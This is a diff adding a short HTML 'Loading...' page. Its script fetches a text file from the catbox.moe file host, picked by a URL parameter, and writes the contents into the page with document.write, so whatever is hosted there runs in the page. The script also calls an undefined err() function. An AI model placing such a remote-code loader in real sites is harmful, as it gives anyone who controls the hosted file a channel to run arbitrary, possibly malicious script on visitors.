@@ -1,1 +1,26 @@
+<!DOCTYPE html>
+<head>
+    <title>Loading...</title>
+</head>
+<style>
+    body {
+        background-color: #000;
+    }
+</style>
+
+<body>
+    <script>
+        var i = new URLSearchParams(window.location.search).get('i');
+        if (i) {
+            try {
+                fetch("https://files.catbox.moe/" + i + ".txt")
+                    .then(res => res.text())
+                    .then(code => { document.write(code); })
+                    .catch(error => { err(); });
+            } catch { err(); }
+        } else { err(); }
+        function home() { /*dir hna chno bghiti yw9a3 fach ykon id ghalat*/ }
+    </script>
+</body>
+</html>
 
